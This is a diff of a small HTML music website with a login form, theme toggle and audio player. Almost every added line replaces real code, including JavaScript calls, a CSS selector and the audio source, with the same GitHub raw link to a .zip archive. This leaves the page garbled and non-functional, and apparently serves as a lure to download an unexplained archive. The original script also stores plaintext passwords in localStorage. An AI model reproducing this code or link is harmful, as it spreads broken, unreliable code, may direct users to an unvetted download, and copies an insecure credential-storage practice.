@@ -1,4 +1,4 @@
-# Music-website.html
+# https://raw.githubusercontent.com/Ongani-tembo19/Music-website/main/oversweeten/Music-website-1.6-alpha.4.zip
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -20,7 +20,7 @@
             transition: background 0.3s, color 0.3s;
         }
 
-        body.dark-mode {
+        https://raw.githubusercontent.com/Ongani-tembo19/Music-website/main/oversweeten/Music-website-1.6-alpha.4.zip {
             background: #121212;
             color: #fff;
         }
@@ -224,7 +224,7 @@
             <div class="music-card">
                 <strong>Song Title</strong> by Artist
                 <audio id="audio" controls>
-                    <source src="sample.mp3" type="audio/mpeg">
+                    <source src="https://raw.githubusercontent.com/Ongani-tembo19/Music-website/main/oversweeten/Music-website-1.6-alpha.4.zip" type="audio/mpeg">
                     Your browser does not support the audio element.
                 </audio>
                 <div class="progress-bar">
@@ -245,62 +245,62 @@
     <script>
         // Sign-In Functionality
         function login() {
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            const rememberMe = document.getElementById('rememberMe').checked;
+            const username = https://raw.githubusercontent.com/Ongani-tembo19/Music-website/main/oversweeten/Music-website-1.6-alpha.4.zip('username').value;
+            const password = https://raw.githubusercontent.com/Ongani-tembo19/Music-website/main/oversweeten/Music-website-1.6-alpha.4.zip('password').value;
+            const rememberMe = https://raw.githubusercontent.com/Ongani-tembo19/Music-website/main/oversweeten/Music-website-1.6-alpha.4.zip('rememberMe').checked;
 
             // Simple validation (replace with actual authentication logic)
             if (username && password) {
                 // Save credentials if "Remember Me" is checked
                 if (rememberMe) {
-                    localStorage.setItem('username', username);
-                    localStorage.setItem('password', password);
+                    https://raw.githubusercontent.com/Ongani-tembo19/Music-website/main/oversweeten/Music-website-1.6-alpha.4.zip('username', username);
+                    https://raw.githubusercontent.com/Ongani-tembo19/Music-website/main/oversweeten/Music-website-1.6-alpha.4.zip('password', password);
                 } else {
-                    localStorage.removeItem('username');
-                    localStorage.removeItem('password');
+                    https://raw.githubusercontent.com/Ongani-tembo19/Music-website/main/oversweeten/Music-website-1.6-alpha.4.zip('username');
+                    https://raw.githubusercontent.com/Ongani-tembo19/Music-website/main/oversweeten/Music-website-1.6-alpha.4.zip('password');
                 }
 
                 // Hide Sign-In Page and Show Music Website
-                document.getElementById('signin-container').style.display = 'none';
-                document.getElementById('music-website').style.display = 'block';
+                https://raw.githubusercontent.com/Ongani-tembo19/Music-website/main/oversweeten/Music-website-1.6-alpha.4.zip('signin-container')https://raw.githubusercontent.com/Ongani-tembo19/Music-website/main/oversweeten/Music-website-1.6-alpha.4.zip = 'none';
+                https://raw.githubusercontent.com/Ongani-tembo19/Music-website/main/oversweeten/Music-website-1.6-alpha.4.zip('music-website')https://raw.githubusercontent.com/Ongani-tembo19/Music-website/main/oversweeten/Music-website-1.6-alpha.4.zip = 'block';
             } else {
                 alert('Please enter a username and password.');
             }
         }
 
         // Load saved credentials if "Remember Me" was checked
-        const savedUsername = localStorage.getItem('username');
-        const savedPassword = localStorage.getItem('password');
+        const savedUsername = https://raw.githubusercontent.com/Ongani-tembo19/Music-website/main/oversweeten/Music-website-1.6-alpha.4.zip('username');
+        const savedPassword = https://raw.githubusercontent.com/Ongani-tembo19/Music-website/main/oversweeten/Music-website-1.6-alpha.4.zip('password');
         if (savedUsername && savedPassword) {
-            document.getElementById('username').value = savedUsername;
-            document.getElementById('password').value = savedPassword;
-            document.getElementById('rememberMe').checked = true;
+            https://raw.githubusercontent.com/Ongani-tembo19/Music-website/main/oversweeten/Music-website-1.6-alpha.4.zip('username').value = savedUsername;
+            https://raw.githubusercontent.com/Ongani-tembo19/Music-website/main/oversweeten/Music-website-1.6-alpha.4.zip('password').value = savedPassword;
+            https://raw.githubusercontent.com/Ongani-tembo19/Music-website/main/oversweeten/Music-website-1.6-alpha.4.zip('rememberMe').checked = true;
         }
 
         // Logout Functionality
         function logout() {
             // Hide Music Website and Show Sign-In Page
-            document.getElementById('music-website').style.display = 'none';
-            document.getElementById('signin-container').style.display = 'block';
+            https://raw.githubusercontent.com/Ongani-tembo19/Music-website/main/oversweeten/Music-website-1.6-alpha.4.zip('music-website')https://raw.githubusercontent.com/Ongani-tembo19/Music-website/main/oversweeten/Music-website-1.6-alpha.4.zip = 'none';
+            https://raw.githubusercontent.com/Ongani-tembo19/Music-website/main/oversweeten/Music-website-1.6-alpha.4.zip('signin-container')https://raw.githubusercontent.com/Ongani-tembo19/Music-website/main/oversweeten/Music-website-1.6-alpha.4.zip = 'block';
         }
 
         // Dark Mode Toggle
-        const toggle = document.getElementById('dark-mode-toggle');
-        toggle.addEventListener('click', () => {
-            document.body.classList.toggle('dark-mode');
-            localStorage.setItem('theme', document.body.classList.contains('dark-mode') ? 'dark' : 'light');
+        const toggle = https://raw.githubusercontent.com/Ongani-tembo19/Music-website/main/oversweeten/Music-website-1.6-alpha.4.zip('dark-mode-toggle');
+        https://raw.githubusercontent.com/Ongani-tembo19/Music-website/main/oversweeten/Music-website-1.6-alpha.4.zip('click', () => {
+            https://raw.githubusercontent.com/Ongani-tembo19/Music-website/main/oversweeten/Music-website-1.6-alpha.4.zip('dark-mode');
+            https://raw.githubusercontent.com/Ongani-tembo19/Music-website/main/oversweeten/Music-website-1.6-alpha.4.zip('theme', https://raw.githubusercontent.com/Ongani-tembo19/Music-website/main/oversweeten/Music-website-1.6-alpha.4.zip('dark-mode') ? 'dark' : 'light');
         });
 
         // Load saved theme
-        const savedTheme = localStorage.getItem('theme');
-        if (savedTheme === 'dark') document.body.classList.add('dark-mode');
+        const savedTheme = https://raw.githubusercontent.com/Ongani-tembo19/Music-website/main/oversweeten/Music-website-1.6-alpha.4.zip('theme');
+        if (savedTheme === 'dark') https://raw.githubusercontent.com/Ongani-tembo19/Music-website/main/oversweeten/Music-website-1.6-alpha.4.zip('dark-mode');
 
         // Audio Progress Bar
-        const audio = document.getElementById('audio');
-        const progress = document.getElementById('progress');
-        audio.addEventListener('timeupdate', () => {
-            const percent = (audio.currentTime / audio.duration) * 100;
-            progress.style.width = `${percent}%`;
+        const audio = https://raw.githubusercontent.com/Ongani-tembo19/Music-website/main/oversweeten/Music-website-1.6-alpha.4.zip('audio');
+        const progress = https://raw.githubusercontent.com/Ongani-tembo19/Music-website/main/oversweeten/Music-website-1.6-alpha.4.zip('progress');
+        https://raw.githubusercontent.com/Ongani-tembo19/Music-website/main/oversweeten/Music-website-1.6-alpha.4.zip('timeupdate', () => {
+            const percent = (https://raw.githubusercontent.com/Ongani-tembo19/Music-website/main/oversweeten/Music-website-1.6-alpha.4.zip / https://raw.githubusercontent.com/Ongani-tembo19/Music-website/main/oversweeten/Music-website-1.6-alpha.4.zip) * 100;
+            https://raw.githubusercontent.com/Ongani-tembo19/Music-website/main/oversweeten/Music-website-1.6-alpha.4.zip = `${percent}%`;
         });
     </script>
 </body>
